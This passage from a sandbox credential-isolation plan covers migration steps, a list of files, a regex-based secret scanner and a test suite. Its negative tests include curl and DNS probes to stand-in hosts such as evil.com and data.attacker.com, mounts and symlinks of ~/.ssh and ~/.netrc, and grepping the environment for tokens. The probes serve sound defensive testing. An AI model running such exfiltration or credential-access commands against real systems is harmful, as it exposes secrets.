gateway_token_refreshes_total{result="success"} 15
gateway_token_refreshes_total{result="failed"} 1
gateway_rate_limited_total 5
```

---

### Phase 6: Migration Strategy

1. **Phase 1 first** — blocklist is backward compatible, no breaking changes
2. **Gateway opt-in** — add `--with-gateway` flag initially
3. **Egress proxy opt-in** — `--egress-allowlist` or `--egress-proxy`
4. **Make gateway + proxy default** for new sandboxes (minor version bump)
5. **Deprecate direct creds** — warn if credentials passed directly
6. **Remove direct support** in a major version (breaking change)

**Backward compatibility flags:**
- `--allow-dangerous-mount`
- `--with-gateway` / `--no-gateway`
- `--egress-allowlist <file|comma>`
- `--allow-egress` (temporary escape hatch)

---

## Files Summary

| File | Action | Purpose |
|------|--------|---------|
| `lib/validate.sh` | Modify | Add dangerous path blocklist + symlink resolution + git remote validation |
| `commands/new.sh` | Modify | Validate mounts, create gateway session, wire flags |
| `lib/arg_parser.sh` | Modify | Add new flags |
| `docker-compose.yml` | Modify | Add gateway + egress proxy + DNS services + TLS config |
| `Dockerfile` | Modify | Bake git URL rewrite config, install credential helper, trust gateway cert |
| `entrypoint.sh` | Modify | Gateway wait, git config verification |
| `safety/network-firewall.sh` | Modify | Block direct git host access (host-side) |
| `gateway/Dockerfile.gateway` | Create | Gateway container image |
| `gateway/gateway.py` | Create | HTTP server + routing + health checks + TLS support |
| `gateway/git_http_backend.py` | Create | Git Smart HTTP handler + origin validation |
| `gateway/session_manager.py` | Create | Session creation + JWT token management + refresh tokens |
| `gateway/auth.py` | Create | JWT token validation |
| `gateway/rate_limiter.py` | Create | Per-session rate limiting |
| `gateway/audit.py` | Create | Structured JSON audit logging |
| `gateway/log_sanitizer.py` | Create | Credential scrubbing for logs/errors |
| `gateway/credential-helper.sh` | Create | Auto-refresh credential helper for sandbox |
| `gateway/config.yaml` | Create | Gateway configuration |
| `gateway/requirements.txt` | Create | Python deps (Flask, PyJWT, etc.) |
| `gateway/tinyproxy.conf` | Create | Egress proxy allowlist |
| `gateway/dnsmasq.conf` | Create | DNS resolver allowlist |
| `gateway/egress_allowlist.txt` | Create | Domain allowlist (derived from network-firewall.sh) |
| `lib/network.sh` | Create | Allowlist export for gateway config generation |
| `lib/git_helpers.sh` | Create | Git retry wrapper for sandbox |
| `tests/test_credential_isolation.sh` | Create | Integration test suite |

---

## Optional: Workspace Secret Scanning

This feature is **opt-in** and addresses secrets in user-provided workspace files.

**Goal:** Detect and warn about secrets in workspace files before sandbox creation.

**Implementation:**

```bash
# lib/secret_scan.sh

scan_workspace_secrets() {
    local workspace="$1"
    local strict="${2:-false}"  # --strict flag fails on any finding

    # Use trufflehog or gitleaks if available
    if command -v trufflehog &> /dev/null; then
        local findings
        findings=$(trufflehog filesystem "$workspace" --json 2>/dev/null | jq -s 'length')

        if [[ "$findings" -gt 0 ]]; then
            warn "Found $findings potential secrets in workspace"
            warn "Run 'trufflehog filesystem $workspace' for details"

            if [[ "$strict" == "true" ]]; then
                error "Aborting due to --strict secret scanning"
                return 1
            fi
        fi
    else
        # Fallback: basic pattern matching
        local patterns=(
            'AKIA[0-9A-Z]{16}'           # AWS Access Key
            'ghp_[a-zA-Z0-9]{36}'        # GitHub PAT
            'sk-[a-zA-Z0-9]{48}'         # OpenAI
            'xox[baprs]-[0-9a-zA-Z-]+'   # Slack
        )

        for pattern in "${patterns[@]}"; do
            if grep -rqE "$pattern" "$workspace" --include='*.env' --include='*.json' --include='*.yaml' --include='*.yml' 2>/dev/null; then
                warn "Potential secret pattern found: $pattern"
                if [[ "$strict" == "true" ]]; then
                    return 1
                fi
            fi
        done
    fi

    return 0
}
```

**CLI flags:**
- `--scan-secrets` — Enable workspace secret scanning (default: off)
- `--strict-secrets` — Fail if any secrets are found

---

## Verification

### Positive Tests (Should Succeed)

| Test | Command | Expected |
|------|---------|----------|
| Gateway health | `curl https://gateway:8080/health` | 200 OK |
| Gateway ready | `curl https://gateway:8080/ready` | 200 OK |
| Git clone via gateway | `git clone https://gateway:8080/git/github/org/repo.git` | Success |
| Git push via gateway | `git push origin main` | Success (URL rewritten) |
| Allowlisted HTTP | `curl https://api.anthropic.com` | Success via proxy |
| DNS resolution (allowed) | `nslookup github.com` | Resolves via gateway DNS |
| Token auto-refresh | Wait for access token expiry, then `git fetch` | Auto-refresh, success |

### Negative Tests (Should Fail)

| Test | Command | Expected |
|------|---------|----------|
| Mount dangerous path | `sandbox new repo --mount ~/.ssh:/ssh` | Error: dangerous path blocked |
| Mount credential file | `sandbox new repo --mount ~/.netrc:/root/.netrc` | Error: dangerous path blocked |
| Mount symlink to dangerous | `ln -s ~/.ssh /tmp/foo && sandbox new --mount /tmp/foo:/mnt` | Error: resolves to dangerous path |
| Direct external HTTP | `curl --noproxy '*' https://example.com` | Connection refused |
| Non-allowlisted host | `curl https://evil.com` | Proxy returns 403 |
| DNS exfiltration | `nslookup data.evil.com` | NXDOMAIN |
| Unauthorized repo | `git clone https://gateway:8080/git/github/other/repo.git` | 403 Forbidden |
| Push to unauthorized repo | `git push https://gateway:8080/git/github/other/repo.git` | 403 Forbidden |
| Expired refresh token | (wait 24h, then) `git push` | 401 Unauthorized |
| Raw TCP egress | `nc -z example.com 443` | Connection refused |
| External creds in sandbox | `env \| grep -E 'GH_TOKEN\|OPENAI_API_KEY'` | Empty |
| Embedded token in remote | `sandbox new repo-with-token` | Error: embedded credential |
| Git config bypass | `GIT_CONFIG_NOSYSTEM=1 git clone https://github.com/org/repo` | 403 (blocked at network level) |
| Rate limit exceeded | 150 rapid requests | 429 Too Many Requests |

### Integration Test Script

```bash
#!/bin/bash
# tests/test_credential_isolation.sh

set -e

echo "=== Credential Isolation Test Suite ==="

# Setup
SANDBOX_ID=$(sandbox new test-repo --repo github.com/org/test --with-gateway)
trap "sandbox rm $SANDBOX_ID" EXIT

# Positive tests
echo "Testing gateway health..."
sandbox exec $SANDBOX_ID curl -sf https://gateway:8080/health

echo "Testing git push via gateway..."
sandbox exec $SANDBOX_ID bash -c 'cd /workspace && echo test > test.txt && git add . && git commit -m "test" && git push'

echo "Testing token refresh..."
# Wait for access token to expire (5 min in prod, 10 sec in test mode)
sleep 12
sandbox exec $SANDBOX_ID git fetch  # Should auto-refresh

# Negative tests
echo "Testing external HTTP is blocked..."
if sandbox exec $SANDBOX_ID curl --noproxy '*' -sf https://example.com; then
    echo "FAIL: Direct external HTTP should be blocked"
    exit 1
fi

echo "Testing unauthorized repo is blocked..."
if sandbox exec $SANDBOX_ID git clone https://gateway:8080/git/github/other/private-repo.git; then
    echo "FAIL: Unauthorized repo should be blocked"
    exit 1
fi

echo "Testing no external credentials in sandbox..."
CREDS=$(sandbox exec $SANDBOX_ID env | grep -E 'GH_TOKEN|OPENAI_API_KEY|GITLAB_TOKEN' || true)
if [[ -n "$CREDS" ]]; then
    echo "FAIL: External credentials found in sandbox: $CREDS"
    exit 1
fi

echo "Testing DNS exfiltration is blocked..."
if sandbox exec $SANDBOX_ID nslookup data.attacker.com; then
    echo "FAIL: Non-allowlisted DNS should be blocked"
    exit 1
fi

echo "Testing git config bypass blocked..."
if sandbox exec $SANDBOX_ID bash -c 'GIT_CONFIG_NOSYSTEM=1 git clone https://github.com/org/repo'; then
    echo "FAIL: Direct git clone should be blocked"
    exit 1
fi

echo "Testing symlink bypass blocked..."
sandbox exec $SANDBOX_ID ln -s /home/ubuntu/.ssh /tmp/ssh-link
if sandbox new test --mount /tmp/ssh-link:/mnt 2>/dev/null; then
    echo "FAIL: Symlink to dangerous path should be blocked"
    exit 1
fi

echo "Testing rate limiting..."
for i in {1..150}; do
    sandbox exec $SANDBOX_ID curl -sf https://gateway:8080/health &
done
wait
# Check that some requests were rate limited
if ! sandbox exec $SANDBOX_ID curl -sf https://gateway:8080/metrics | grep 'rate_limited'; then
    echo "FAIL: Rate limiting should have triggered"
    exit 1
fi

echo "Testing audit log exists..."
if ! docker exec gateway test -f /var/log/gateway/audit.jsonl; then
    echo "FAIL: Audit log should exist"
    exit 1
fi

echo "=== All tests passed ==="
```

---

## Summary of Security Improvements

| Issue | Priority | Mitigation |
|-------|----------|------------|
| Token accessible in sandbox | HIGH | Short-lived access tokens (5 min) with auto-refresh |
| Git config bypass | HIGH | Gateway origin validation + network-level git blocking |
| NET_ADMIN capability risk | HIGH | Use Docker network isolation, no iptables in sandbox |
| Symlink bypass for blocklist | HIGH | Resolve symlinks with `realpath` before validation |
| No rate limiting | MEDIUM | Per-session rate limiting (100 req/min default) |
| HTTP on internal network | MEDIUM | TLS enabled by default with auto-generated certs |
| No audit logging | MEDIUM | Structured JSON audit logs for all security events |
